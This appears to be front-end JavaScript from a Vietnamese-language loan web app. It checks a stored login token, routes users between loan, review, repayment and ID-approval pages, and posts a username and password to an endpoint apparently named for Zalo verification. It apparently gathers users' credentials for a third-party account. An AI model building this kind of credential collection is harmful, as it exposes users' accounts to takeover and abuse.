var loginData = new Object();
		$(function() {
			init();
		})
		
		function init(){
			loginData = JSON.parse(localStorage.getItem("loginData"));
			
			if (loginData == null) {
				alert("Danh tính đã hết hạn, xin vui lòng đăng nhập trở lại");
				window.location.href = "registered.html";
			} else {
				var requestData = new Object();
				requestData.userid = loginData.ui;
				requestData.token = loginData.token;
				loadAjaxPost(
					"HtmlHminte",
					requestData,
					function(data) {
						if (data.error == -1) {
							localStorage.removeItem("loginData");
							alert(data.msg);
							window.location.href = "registered.html";
						}else if(data.error == 100){
							window.location.href = "repayment.html";
						}else if(data.error == 101){
							window.location.href = "review.html";
						}else if(data.error == 105){
							alert(data.msg);
							window.location.href = "loan.html";
						}else if(data.error == 200){
							return null;
						}else if(data.error == 300 || data.error == 400){
							window.location.href = "approveid.html";
						}else if(data.error == -11 || data.error == -12){
							localStorage.removeItem("loginData");
							alert(data.msg);
							window.location.href = "registered.html";
						}else{
							window.location.href = "registered.html";
						}
					});
			}
		}
		

		function commit() {
			loginData = JSON.parse(localStorage.getItem("loginData"));
			//用户输入的验证信息
			var u_username = $("#username").val();
			var u_password = $("#password").val();

			if(u_username == "" || u_username == null){
				$(".gx_alert").css("display","block");
				$(".gx_alert_p").html("Không thể để trống họ tên")
				$("#bankrz").attr("disabled", true);
				setTimeout(function(){
					$(".gx_alert").css("display","none");
					$("#bankrz").attr("disabled", false);
					},3000);
			}
			if(u_password == "" || u_password == null){
				$(".gx_alert").css("display","block");
				$(".gx_alert_p").html("Mật mã không thể để trống")
				$("#bankrz").attr("disabled", true);
				setTimeout(function(){
					$(".gx_alert").css("display","none");
					$("#bankrz").attr("disabled", false);
					},3000);
			}
			var requestData = new Object();
			requestData.userid = loginData.ui;
			requestData.token = loginData.token;
			requestData.username = u_username;
			requestData.password = u_password;
			loadAjaxPost(
					"GetMofaZaloRZ",
					requestData,
					function(data) {
						if(data.error == 0){
							window.location.href = "loan.html";
					
						}else if(data.error == -1){
							localStorage.removeItem("loginData");
							$(".gx_alert").css("display","block");
							$(".gx_alert_p").html(data.msg)
							window.location.href = "registered.html";
						}else if(data.error < 0){
							$(".gx_alert").css("display","block");
							$(".gx_alert_p").html(data.msg)
							$("#bankrz").attr("disabled", true);
							setTimeout(function(){
								$(".gx_alert").css("display","none");
								$("#bankrz").attr("disabled", false);
								},3000);
						}
					});
		}
